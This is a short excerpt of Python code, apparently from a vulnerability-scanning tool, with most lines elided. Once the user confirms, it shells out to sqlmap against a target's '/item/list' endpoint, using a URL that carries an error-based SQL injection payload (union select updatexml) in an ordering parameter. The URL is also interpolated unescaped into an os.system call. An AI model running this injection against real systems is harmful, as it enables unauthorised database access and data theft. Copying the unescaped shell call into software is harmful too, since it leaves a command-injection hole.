            ...
            if not self.batch:
                ...
                if choose == "y":
                    ...
                    try:
                        ...
                        os.system(f"cd cve/VulsScan/sqlmap/ && python sqlmap.py -u \"{url}/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,*,0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
